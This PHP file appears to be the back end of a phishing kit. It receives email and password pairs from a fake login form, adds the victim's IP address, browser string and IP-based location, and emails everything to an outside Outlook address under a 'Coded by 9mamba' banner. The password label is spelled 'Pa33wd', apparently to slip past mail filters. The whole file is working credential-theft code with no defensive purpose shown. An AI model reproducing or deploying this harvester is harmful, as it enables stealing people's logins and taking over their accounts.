<?php
// Function to get the user's IP address
function getUserIP()
{
    $ip_address = '';
    // Check for shared internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }
    // Check for IP address from proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    // Check for remote address
    else {
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }
    return $ip_address;
}

// Function to get user location based on IP address
function getUserLocation($ip)
{
    // Replace 'your_api_key' with your actual API key from IP geolocation service
    $apiKey = 'your_api_key';
    // API endpoint for IP geolocation service
    $apiUrl = 'https://api.ipgeolocation.io/ipgeo?apiKey=' . $apiKey . '&ip=' . $ip;

    // Fetch data from the API
    $data = file_get_contents($apiUrl);
    // Decode JSON response
    $locationData = json_decode($data, true);

    // Format the location information
    $location = '';
    if ($locationData && isset($locationData['city']) && isset($locationData['country_name'])) {
        $location = $locationData['city'] . ', ' . $locationData['country_name'];
    }
    return $location;
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if email and password are set and not empty
    if (isset($_POST['email']) && isset($_POST['password']) && !empty($_POST['email']) && !empty($_POST['password'])) {
        // Sanitize and validate email (you can use additional validation if needed)
        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        // You can also perform additional validation for email here if needed

        // Sanitize password (you may want to perform additional validation or hashing)
        $password = $_POST['password'];

        // Get user's IP address
        $ip = getUserIP();

        // Get user's browser information
        $browser = $_SERVER['HTTP_USER_AGENT'];

        // Get user's location based on IP address
        $location = getUserLocation($ip);

        // Email subject
        $subject = 'User Details';

        // Email body
        
        $message =  "|---------- Personal Info ----------|\n";
        $message .= "|👤 E-mail:      " . $email . "\n";
        $message .= "|🔐 Pa33wd:      " . $password . "\n";
        $message .= "|🔍 IP:          " . $ip . "\n";
        $message .= "|📍 Location:    " . $location . "\n";
        $message .= "|🌐 Browser:     " . $browser . "\n";
        $message .= "|💼 Project Id:  LEERA\n";
        $message .= "|-------- Coded by 9mamba --------|";


        // Your email address
        $to = 'ninemamba@outlook.com';

        // Send email
        if (mail($to, $subject, $message)) {
            echo "Login details sent successfully!";
        } else {
            echo "Error: Unable to send login details.";
        }
    } else {
        // If email or password is not set or empty, show an error message
        echo "Error: Email and password are required.";
    }
} else {
    // If the request method is not POST, show an error message
    echo "Error: Invalid request.";
}
?>
